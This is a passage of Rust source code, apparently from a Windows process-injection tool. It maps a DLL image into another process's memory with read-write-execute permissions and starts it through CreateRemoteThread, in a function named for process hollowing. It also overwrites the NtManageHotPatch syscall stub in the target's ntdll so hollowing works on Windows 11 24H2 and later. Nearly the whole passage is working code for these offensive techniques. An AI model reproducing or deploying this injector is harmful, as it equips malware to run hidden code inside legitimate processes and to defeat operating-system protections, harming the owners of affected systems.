            Err(e) => {
                // Print all parameters and error
                log::info!("[ERROR] CreateRemoteThread failed: {e:?}");
                log::info!("[ERROR] Parameters:");
                log::info!("  process_handle: 0x{:X}", process_handle.0 as usize);
                log::info!("  remote_addr: 0x{:X}", remote_addr);
                log::info!("  remote_addr as fn ptr: {:?}", unsafe {std::mem::transmute::<usize, *const ()>(remote_addr)});
                log::info!("  export_name: {}", export_name);
                log::info!("  dll_base: 0x{:X}", dll_base);
                log::info!("  export_rva: 0x{:X}", export_rva);
                log::info!("  Target PID: {}", pid);
                // Try to get last error
                use windows::Win32::Foundation::GetLastError;
                let last_error = unsafe { GetLastError() };
                log::info!("  GetLastError: 0x{:X}", last_error.0);
                Err(anyhow::anyhow!("CreateRemoteThread: {e:?} (remote_addr: 0x{:X}, process_handle: 0x{:X}, GetLastError: 0x{:X})", remote_addr, process_handle.0 as usize, last_error.0))
            }
        }
    }

    
    pub unsafe fn inject_hollowed_process(    
        dll_data: &[u8],
        process_handle: HANDLE,
        function_name: &str,
        _pid: u32
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            // let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid.as_u32())
            // .map_err(|e| format!("OpenProcess failed: {}", e))?;

            // Extract the RVA of the desired export function (e.g., "DllMain")
            let load_rva = Self::get_export_rva(dll_data, function_name)?;

            // Parse preferred base from PE header (supporting PE32 and PE32+)
            let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
            let optional_header = &dll_data[e_lfanew + 0x18..];
            let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());

            let preferred_base = if magic == 0x10B {
                u32::from_le_bytes(optional_header[0x1C..0x20].try_into().unwrap()) as usize
            } else {
                u64::from_le_bytes(optional_header[0x18..0x20].try_into().unwrap()) as usize
            };

            // Allocate memory in the target process at preferred base
            let alloc = VirtualAllocEx(
                process_handle,
                Some(preferred_base as *mut _),
                dll_data.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc.is_null() {
                return Err(anyhow::anyhow!("VirtualAllocEx failed"));
            }

            // Write DLL headers and sections
            WriteProcessMemory(process_handle, alloc, dll_data.as_ptr() as _, dll_data.len(), None)
                .map_err(|e| anyhow::anyhow!("WriteProcessMemory failed: {}", e))?;

            // Calculate remote entry point address by adding base + RVA
            let entry_point = (alloc as usize).wrapping_add(load_rva as usize);

            // Create remote thread at entry point
            let thread_handle = CreateRemoteThread(
                process_handle,
                None,
                0,
                Some(std::mem::transmute(entry_point)),
                None,
                0,
                None,
            )?;

            if thread_handle.is_invalid() {
                return Err(anyhow::anyhow!("CreateRemoteThread failed"));
            }

            log::info!("Wrote {} bytes to remote process at {:p}", dll_data.len(), alloc);
            let mut verify = vec![0u8; dll_data.len()];
            ReadProcessMemory(process_handle, alloc, verify.as_mut_ptr() as _, dll_data.len(), None)?;
            
            if verify == dll_data {
                log::info!("Remote memory matches injected DLL image");
            } else {
               return Err(anyhow::anyhow!("WARNING: Remote memory does not match!"));
            }
            // let process = OwnedProcess::from_pid(pid).map_err(|e| e.to_string())?;
            // let syringe = Syringe::for_process(process);
            // let injected = syringe.inject(&path).map_err(|e| e.to_string())?;
            // ProcessModule::new_local_unchecked(handle)
            // let remote_proc = syringe
            //     .get_raw_procedure::<extern "system" fn() -> i32>(injected, function)
            //     .map_err(|e| e.to_string())?
            //     .ok_or("Procedure not found")?;

            // Wait until the user clicks OK and the thread exits
            WaitForSingleObject(thread_handle, INFINITE);

            CloseHandle(thread_handle)?;

            Ok(())
        }
    }

    /// Patch NtManageHotPatch syscall stub in remote process for Win11 24H2+ hollowing compatibility
    pub fn patch_nt_manage_hotpatch64(h_process: HANDLE) -> anyhow::Result<(), anyhow::Error> {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory, FlushInstructionCache};
        use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, PAGE_EXECUTE_READ};
        use windows_strings::PCSTR;
        use std::ffi::c_void;

        // Get local ntdll base and NtManageHotPatch offset
        let ntdll = unsafe { GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())) }?;
        let ntmanage_addr = unsafe { GetProcAddress(ntdll, PCSTR(b"NtManageHotPatch\0".as_ptr())) };
        let ntmanage_addr = match ntmanage_addr {
            Some(ptr) => ptr as *const c_void,
            None => return Err(anyhow::anyhow!("GetProcAddress(NtManageHotPatch) failed")),
        };
        let offset = (ntmanage_addr as usize) - (ntdll.0 as usize);
        // Get remote ntdll base in target process
        let remote_ntdll = Self::get_remote_module_base_handle(h_process, "ntdll.dll")?;
        if remote_ntdll.is_null() {
            return Err(anyhow::anyhow!("Remote ntdll.dll not found"));
        }
        let remote_patch_addr = (remote_ntdll as usize + offset) as *mut c_void;

        // Prepare patch bytes: mov eax, C00000BB; ret
        let patch: [u8; 6] = [0xB8, 0xBB, 0x00, 0x00, 0xC0, 0xC3];
        let stub_size = 0x20;
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        // Change protection to RW
        let vp = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_READWRITE, &mut old_protect) };
        if !vp.is_ok() {
            return Err(anyhow::anyhow!("VirtualProtectEx failed"));
        }
        // Read original stub for validation (optional)
        let mut orig_stub = [0u8; 0x20];
        let mut out_bytes = 0usize;
        let rp = unsafe { ReadProcessMemory(h_process, remote_patch_addr, orig_stub.as_mut_ptr() as *mut c_void, stub_size, Some(&mut out_bytes)) };
        if !rp.is_ok() || out_bytes < 6 {
            return Err(anyhow::anyhow!("ReadProcessMemory failed"));
        }
        // Write patch
        let wp = unsafe { WriteProcessMemory(h_process, remote_patch_addr, patch.as_ptr() as *const c_void, patch.len(), Some(&mut out_bytes)) };
        if !wp.is_ok() || out_bytes != patch.len() {
            return Err(anyhow::anyhow!("WriteProcessMemory failed"));
        }
        // Restore protection
        let vp2 = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_EXECUTE_READ, &mut old_protect) };
        if !vp2.is_ok() {
            return Err(anyhow::anyhow!("VirtualProtectEx restore failed"));
        }
        // Flush instruction cache
        let _ = unsafe { FlushInstructionCache(h_process, Some(remote_patch_addr), patch.len()) };
        Ok(())
    }

}